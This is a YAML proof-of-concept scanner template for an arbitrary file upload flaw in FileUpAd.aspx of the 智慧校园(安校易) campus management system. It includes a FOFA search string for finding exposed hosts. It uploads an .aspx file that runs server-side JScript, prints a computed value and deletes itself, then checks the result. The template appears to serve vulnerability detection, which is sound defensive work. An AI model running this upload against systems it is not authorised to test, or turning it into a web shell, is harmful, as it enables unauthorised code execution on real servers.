id: poc-yaml-winstaryc-fileupad-aspx-anyfile-upload
info:
  name: 智慧校园(安校易)管理系统FileUpAd.aspx存在文件上传漏洞
  severity: critical
  tags:
  - 文件上传
  finger: 智慧校园(安校易)管理系统
  fofa: title="智慧综合管理平台登入"
variables:
  t1: random_int(100,1000)
  t2: random_int(100,1000)
  t3: t1 * t2
requests:
- method: POST
  path: /Module/FileUpPage/FileUpAd.aspx?file_tmid=upload
  headers:
    Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
  data: '------21909179191068471382830692394

    Content-Disposition: form-data; name="File"; filename="1.aspx"

    Content-Type: image/jpeg


    <%@ Page Language="Jscript" validateRequest="false" %>

    This website has a vulnerability

    <%Response.Write({{.t1}} * {{.t2}});System.IO.File.Delete(Request.PhysicalPath);%>

    ------21909179191068471382830692394--'
  expression: "status_code == 200 && \ncontains(body,\"成功\") &&\ncontains(body,\"\
    文件大小为\")\n"
- method: GET
  path: /imgnews/imgad/000000/upload.aspx
  expression: 'status_code == 200 &&

    contains(body,"This website has a vulnerability") &&

    contains(body,t3)

    '
transport: http
